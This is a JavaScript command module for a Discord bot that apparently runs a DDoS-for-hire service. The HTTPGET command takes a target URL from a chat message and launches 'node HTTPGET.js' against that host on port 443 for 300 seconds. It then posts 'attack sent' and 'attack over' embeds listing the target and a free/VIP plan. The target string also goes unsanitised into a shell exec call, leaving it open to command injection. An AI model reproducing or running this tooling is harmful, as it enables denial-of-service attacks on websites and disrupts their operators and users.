const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../RoomID.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu .HTTPGET https://example.com/`")
	.setFooter("Vui lòng không tấn công các website có domain .gov")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`node HTTPGET.js ${host} 443 300`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('The attack has stopped ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('**𝐀𝐓𝐓𝐀𝐂𝐊 𝐄𝐍𝐃**')
	.setTimestamp()
	.setDescription("**► The Attack Is Over 💥**")
	.setFooter('© Dev: voleminh#2331', client.user.avatarURL)
	.setTimestamp()
 message.channel.send(embed);
 }, 200000); //time in milliseconds
var gifler = ["https://data.whicdn.com/images/314292594/original.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
     .setTitle('                                                                    **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐄𝐍𝐃**                                              ')
	.setTimestamp()
  .setDescription("**Attack has been sent successfully** \n**Plan** ➙ `FREE` \n **Vip** ➙ `False` \n**User** ➙ `" + message.author.username + "` \n **Target** ➙ `" + host + "` \n **Port** ➙ `443` \n **Method** ➙ `HTTPGET` \n **Time** ➙ `300`")	
  .setFooter('Copyrigtht © VoLeMinh 2022 All Rights Reserved', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['HTTPGET'],
  permLevel: 0
}

exports.help = {
  name: 'HTTPGET',
  description: 'Minh',
  usage: 'HTTPGET'
}